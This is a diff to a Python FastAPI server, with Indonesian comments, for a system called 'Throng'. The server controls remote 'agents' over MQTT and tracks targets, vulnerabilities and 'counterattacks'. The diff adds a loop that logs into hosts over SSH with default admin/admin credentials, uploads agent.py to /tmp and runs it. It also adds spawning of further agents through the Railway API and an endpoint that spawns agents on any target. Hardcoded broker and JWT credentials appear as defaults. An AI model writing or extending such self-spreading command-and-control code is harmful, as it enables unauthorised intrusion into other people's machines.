@@ -14,6 +14,8 @@ import jwt
 from sklearn.ensemble import IsolationForest
 import numpy as np
 import paramiko
+import requests
+import uuid
 import threading
 
 app = FastAPI()
@@ -21,12 +23,19 @@ app.mount("/static", StaticFiles(directory="static"), name="static")
 templates = Jinja2Templates(directory="templates")
 security = HTTPBearer()
 
-# Konfigurasi JWT dan MQTT
+# Ambil konfigurasi dari variabel lingkungan dengan default
 JWT_SECRET = os.getenv("JWT_SECRET", "throng_default_secret_1234567890")
 JWT_ALGORITHM = "HS256"
 MQTT_BROKER = os.getenv("MQTT_BROKER", "5374fec8494a4a24add8bb27fe4ddae5.s1.eu.hivemq.cloud:8883")
 MQTT_USERNAME = os.getenv("MQTT_USERNAME", "throng_user")
 MQTT_PASSWORD = os.getenv("MQTT_PASSWORD", "ThrongPass123!")
+RAILWAY_API_TOKEN = os.getenv("RAILWAY_API_TOKEN", "")
+PROJECT_ID = os.getenv("RAILWAY_PROJECT_ID", "")
+DEFAULT_SPAWN_TARGET = os.getenv("DEFAULT_SPAWN_TARGET", "192.168.1.10")
+DEFAULT_SSH_USERNAME = os.getenv("DEFAULT_SSH_USERNAME", "admin")
+DEFAULT_SSH_PASSWORD = os.getenv("DEFAULT_SSH_PASSWORD", "admin")
+AUTO_SPAWN_INTERVAL = int(os.getenv("AUTO_SPAWN_INTERVAL", "300"))  # Dalam detik, default 5 menit
+GITHUB_REPO = os.getenv("GITHUB_REPO", "username/throng")
 
 # Model untuk perintah
 class Command(BaseModel):
@@ -42,10 +51,14 @@ def init_db():
     c = conn.cursor()
     c.execute('''CREATE TABLE IF NOT EXISTS reports 
                  (id INTEGER PRIMARY KEY, agent_id TEXT, data TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
+    c.execute('''CREATE TABLE IF NOT EXISTS counterattacks 
+                 (id INTEGER PRIMARY KEY, agent_id TEXT, target TEXT, action TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
     c.execute('''CREATE TABLE IF NOT EXISTS agents 
                  (id INTEGER PRIMARY KEY, agent_id TEXT, status TEXT, last_seen DATETIME, ip TEXT, host TEXT)''')
     c.execute('''CREATE TABLE IF NOT EXISTS targets 
                  (id INTEGER PRIMARY KEY, target TEXT, vulnerability TEXT, status TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP, score REAL)''')
+    c.execute('''CREATE TABLE IF NOT EXISTS emergency_logs 
+                 (id INTEGER PRIMARY KEY, agent_id TEXT, action TEXT, details TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
     conn.commit()
     conn.close()
 
@@ -56,9 +69,9 @@ mqtt_client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
 def on_connect(client, userdata, flags, rc, properties=None):
     print(f"MQTT connected with result code {rc}")
     if rc == 0:
-        client.subscribe("throng/#")
+        client.subscribe("throng/#")  # Subscribe ke semua topik Throng
 mqtt_client.on_connect = on_connect
-mqtt_client.tls_set()
+mqtt_client.tls_set()  # Aktifkan TLS untuk HiveMQ Cloud
 mqtt_client.username_pw_set(MQTT_USERNAME, MQTT_PASSWORD)
 mqtt_client.connect(MQTT_BROKER.split(":")[0], int(MQTT_BROKER.split(":")[1]), 60)
 time.sleep(1)
@@ -83,13 +96,13 @@ async def verify_token(credentials: HTTPAuthorizationCredentials = Depends(secur
     except jwt.PyJWTError:
         raise HTTPException(status_code=401, detail="Invalid token")
 
-# Fungsi spawn agent otomatis
-def spawn_agent_automatically(target, credentials):
+# Fungsi spawn agent otomatis via SSH
+def spawn_agent_ssh(target, credentials):
     try:
         new_agent_id = str(uuid.uuid4())
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect(target, username=credentials.get("username", "admin"), password=credentials.get("password", "admin"))
+        ssh.connect(target, username=credentials.get("username", DEFAULT_SSH_USERNAME), password=credentials.get("password", DEFAULT_SSH_PASSWORD))
         sftp = ssh.open_sftp()
         sftp.put("agent.py", f"/tmp/agent_{new_agent_id}.py")
         ssh.exec_command(f"python3 /tmp/agent_{new_agent_id}.py &")
@@ -107,6 +120,41 @@ def spawn_agent_automatically(target, credentials):
         print(f"Error spawning agent: {e}")
         return None
 
+# Fungsi spawn agent otomatis via Railway API
+def spawn_agent_railway():
+    if not RAILWAY_API_TOKEN or not PROJECT_ID:
+        print("Railway API Token or Project ID not set")
+        return
+    headers = {"Authorization": f"Bearer {RAILWAY_API_TOKEN}", "Content-Type": "application/json"}
+    data = {
+        "query": """
+        mutation createService($input: ServiceInput!) {
+            createService(input: $input) {
+                id
+            }
+        }
+        """,
+        "variables": {
+            "input": {
+                "projectId": PROJECT_ID,
+                "name": f"agent-{uuid.uuid4()}",
+                "sourceRepo": GITHUB_REPO,
+                "rootDirectory": "",
+                "startCommand": "python agent.py",
+                "env": [
+                    {"key": "MQTT_BROKER", "value": MQTT_BROKER},
+                    {"key": "MQTT_USERNAME", "value": MQTT_USERNAME},
+                    {"key": "MQTT_PASSWORD", "value": MQTT_PASSWORD}
+                ]
+            }
+        }
+    }
+    response = requests.post("https://backboard.railway.app/graphql/v2", headers=headers, json=data)
+    if response.status_code == 200:
+        print("New agent spawned via Railway")
+    else:
+        print(f"Error spawning agent: {response.text}")
+
 # Pemantauan otomatis
 def auto_monitor():
     while True:
@@ -117,10 +165,12 @@ def auto_monitor():
         conn.close()
         anomalies = analyze_threats(reports)
         if any(anomalies) or len(reports) < 3:  # Jika ada ancaman atau agent terlalu sedikit
-            target = "192.168.1.10"  # Ganti dengan IP target yang valid
-            credentials = {"username": "admin", "password": "admin"}  # Ganti dengan kredensial yang valid
-            spawn_agent_automatically(target, credentials)
-        time.sleep(300)  # Cek setiap 5 menit
+            target = os.getenv("DEFAULT_SPAWN_TARGET", "192.168.1.10")
+            credentials = {"username": DEFAULT_SSH_USERNAME, "password": DEFAULT_SSH_PASSWORD}
+            spawn_agent_ssh(target, credentials)  # Spawn via SSH
+            if RAILWAY_API_TOKEN and PROJECT_ID:  # Spawn via Railway jika diatur
+                spawn_agent_railway()
+        time.sleep(AUTO_SPAWN_INTERVAL)
 
 threading.Thread(target=auto_monitor, daemon=True).start()
 
@@ -172,7 +222,8 @@ async def send_command(command: Command):
     conn = sqlite3.connect("throng.db")
     c = conn.cursor()
     if command.action == "spawn_agent" and command.target:
-        new_agent_id = spawn_agent_automatically(command.target, command.params.get("credentials", {"username": "admin", "password": "admin"}))
+        credentials = command.params.get("credentials", {"username": DEFAULT_SSH_USERNAME, "password": DEFAULT_SSH_PASSWORD})
+        new_agent_id = spawn_agent_ssh(command.target, credentials)
         if new_agent_id:
             c.execute("INSERT INTO agents (agent_id, status, last_seen, ip, host) VALUES (?, ?, ?, ?, ?)", 
                       (new_agent_id, "active", time.strftime("%Y-%m-%d %H:%M:%S"), socket.gethostbyname(command.target), command.target))
